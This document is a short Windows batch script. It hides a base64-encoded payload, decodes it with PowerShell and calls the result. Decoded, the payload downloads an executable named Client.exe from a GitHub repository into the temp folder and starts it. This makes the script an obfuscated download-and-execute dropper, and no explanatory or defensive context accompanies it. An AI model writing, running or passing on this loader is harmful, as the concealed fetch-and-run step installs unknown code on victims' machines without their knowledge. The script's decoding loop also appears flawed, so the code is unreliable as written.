@echo off
set "b64=QGVjaG8gb2ZmDQpTRVQgIlVSTD1odHRwczovL2dpdGh1Yi5jb20vTHVuYXNYODIvV2h5SW1TdGlsbFVwbG9hZGluZy9yYXcvcmVmcy9oZWFkcy9tYWluL0NsaWVudC5leGUiDQpTRVQgIlNhdmVQYXRoPSVURU1QJVxceW91cmZpbGUuZXhlIg0KDQpwb3dlcnNoZWxsIC1Db21tYW5kICJJbnZva2UtV2ViUmVxdWVzdCAtVXJpICclVVJMJScgLU91dEZpbGUgJyVTYXZlUGF0aCUnIg0KDQpJRiBFWElTVCAiJVNhdmVQYXRoJSIgKA0KICAgIHN0YXJ0ICIiICIlU2F2ZVBhdGglIg0KKSBFTFNFICgNCiAgICBFQ0hPIERvd25sb2FkIGZhaWxlZCBvciBmaWxlIG5vdCBmb3VuZC4NCikNCnBhdXNlDQo="

for /f "delims=" %%A in ('powershell -NoProfile -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%b64%'))"') do set "cmd=%%A"

call %cmd%
